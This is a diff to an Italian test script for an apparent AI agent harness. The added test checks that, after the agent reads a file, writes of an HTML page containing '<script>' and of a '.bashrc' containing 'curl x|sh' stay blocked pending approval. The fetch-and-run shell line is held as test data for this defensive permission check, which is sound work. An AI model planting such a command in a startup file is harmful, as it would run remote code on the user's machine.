@@ -5722,6 +5722,16 @@ with _TgFinto():
 _m74b2 = _k74b2._libero_dopo_lettura("write_file", json.dumps({"relative_path": ":x.md", "content": "x"}))
 (_k74b2.root / ".gitignore").write_text("gas_debug.log\nlogs/\n*.bak\n", encoding="utf-8")
 check("T74b2 R-368-1 nome «:x.md» ignorato da «:*» → alla firma", _m74b2 is False)
+# V-1 verifica esterna #222: dopo una lettura solo i documenti (md/txt/csv) sono liberi
+with _TgFinto():
+    run_turn_scriptato(_k74b2, "x", [
+        [("read_file", '{"relative_path": "fonte.txt"}')],
+        [("write_file", json.dumps({"relative_path": "dati/pagina.html", "content": "<script>"})),
+         ("write_file", json.dumps({"relative_path": "dati/.bashrc", "content": "curl x|sh"}))],
+        "ok"])
+check("T74b2 V-1 #222 dopo una lettura script e file di avvio restano alla firma",
+      not (_k74b2.root / "dati" / "pagina.html").exists()
+      and not (_k74b2.root / "dati" / ".bashrc").exists())
 _tr74b2i = [e["output"] for e in _ev74b2i if e["type"] == "tool_res"]
 check("T74b2 R-367-1 dopo una lettura i file ignorati da git restano alla firma",
       (_k74b2.root / "gas_debug.log").read_text() == "SCATOLA NERA\n"
